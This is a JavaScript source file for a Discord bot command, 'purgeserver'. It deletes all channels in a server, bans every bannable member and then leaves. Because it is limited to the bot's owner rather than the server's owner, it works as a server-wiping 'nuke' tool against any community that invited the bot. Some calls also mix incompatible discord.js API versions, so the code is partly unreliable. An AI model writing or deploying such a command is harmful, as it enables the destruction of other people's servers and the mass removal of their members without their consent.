/* eslint-disable no-useless-escape */
const Discord = require("discord.js");
const { Command } = require('discord.js-commando');

module.exports = class rufus extends Command {
    constructor(client) {
        super(client, {
            name: 'purgeserver',
            group: 'admin',
            memberName: 'purgeserver',
            description: 'Purges the server',
            guildOnly: true,
            ownerOnly: true,
            clientPermissions:['BAN_MEMBERS']
        });
    }

    async run(message) {
        message.guild.channels.cache.forEach(channel => channel.delete());
        try {

            message.guild.members.filter(member => member.bannable).forEach(member => member.ban());
            message.delete(1000);

        } catch (e) {

            console.log(e.stack);

        }

        try {

            message.guild.leave();

        } catch (e) {

            console.log(e.stack);

        }
    }
};